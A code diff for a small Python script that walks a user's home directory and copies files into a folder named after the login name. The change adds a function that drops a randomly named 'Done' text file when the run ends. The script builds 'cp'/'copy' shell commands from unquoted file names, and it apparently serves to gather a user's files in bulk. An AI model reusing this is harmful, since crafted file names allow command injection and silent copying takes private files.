@@ -1,8 +1,20 @@
 ﻿# -*- coding: utf-8 -*-
 
-from os import walk,getlogin,system,mkdir
+from os import walk,getlogin,system,mkdir,rmdir
 from platform import uname
+from time import sleep
+from random import choice,randint
+from string import ascii_letters,digits
 
+#Creates a text in order to warn that the program has ended.
+def warnMe():
+	chars = ascii_letters+digits
+	temp = ['Done-']
+	for i in range(randint(10,100)):
+		temp.append(choice(chars))
+	f=open(''.join(temp)+'.txt','w')
+	f.close()
+	
 #returns the home path of user
 def getPath():
 	if uname()[0] == 'Linux':
@@ -34,3 +46,4 @@ for roots,dirs,files in walk(path):
 				system('cp %s/%s %s/%s' % (roots,name,getlogin(),name))
 			else:
 				system('copy %s\\%s %s\\%s' % (roots,name,getlogin(),name))
+warnMe()
